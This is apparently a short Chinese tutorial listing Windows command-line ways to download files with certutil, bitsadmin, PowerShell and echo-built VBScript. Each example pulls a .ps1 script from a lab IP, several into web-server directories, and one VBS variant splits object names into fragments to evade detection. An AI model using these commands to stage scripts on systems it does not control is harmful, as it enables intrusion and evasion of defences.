在**windows**的环境下，dos窗口里有以下多个命令支持**下载**。最常用的有powershell、vbs、certutil、bitadmin等命令。

### certutil

```
certutil -urlcache -split -f http://192.168.203.140/b.ps1
```

适用于server 2003以上版本
详情参考：
[https://docs.microsoft.com/en-us/previous-versions/orphan-topics/ws.10/cc773087(v=ws.10)?redirectedfrom=MSDN](https://links.jianshu.com/go?to=https%3A%2F%2Fdocs.microsoft.com%2Fen-us%2Fprevious-versions%2Forphan-topics%2Fws.10%2Fcc773087(v%3Dws.10)%3Fredirectedfrom%3DMSDN)

### bitsadmin

```
bitsadmin /transfer myDownLoadJob /download /priority normal "http://192.168.203.140/b.ps1" "E:\\phpstudy_pro\\WWW\\b.ps1"
```

适用于**windows** 7以上版本。
详情参考：
[https://docs.microsoft.com/zh-cn/**windows**/win32/bits/bitsadmin-tool?redirectedfrom=MSDN](https://links.jianshu.com/go?to=https%3A%2F%2Fdocs.microsoft.com%2Fzh-cn%2Fwindows%2Fwin32%2Fbits%2Fbitsadmin-tool%3Fredirectedfrom%3DMSDN)

### powershell

```
powershell (new-object Net.WebClient).DownloadFile('http://192.168.203.140/a.ps1','E:\phpstudy_pro\WWW\a.ps1')
```

适用于**windows** 7以上版本。

### vbs

第一种把**下载**地址直接echo输入download.vbs。直接**下载**即可。

```
echo Set Post = CreateObject("Msxml2.XMLHTTP") >>download.vbs
echo Set Shell = CreateObject("Wscript.Shell") >>download.vbs
echo Post.Open "GET","http://192.168.203.140/a.ps1",0 >>download.vbs
echo Post.Send() >>download.vbs
echo Set aGet = CreateObject("ADODB.Stream") >>download.vbs
echo aGet.Mode = 3 >>download.vbs
echo aGet.Type = 1 >>download.vbs
echo aGet.Open() >>download.vbs
echo aGet.Write(Post.responseBody) >>download.vbs
echo aGet.SaveToFile "D:/a.ps1",2 >>download.vbs
```

第二种保存脚本后再**下载**指定**文件**。

```
echo set a=createobject(^"adod^"+^"b.stream^"):set w=createobject(^"micro^"+^"soft.xmlhttp^"):w.open^"get^",wsh.arguments(0),0:w.send:a.type=1:a.open:a.write w.responsebody:a.savetofile wsh.arguments(1),2  >> downfile.vbs
cscript downfile.vbs http://192.168.203.140/a.ps1 D:\\tomcat8.5\\webapps\\x.ps1
```

适用于server 2003 以上版本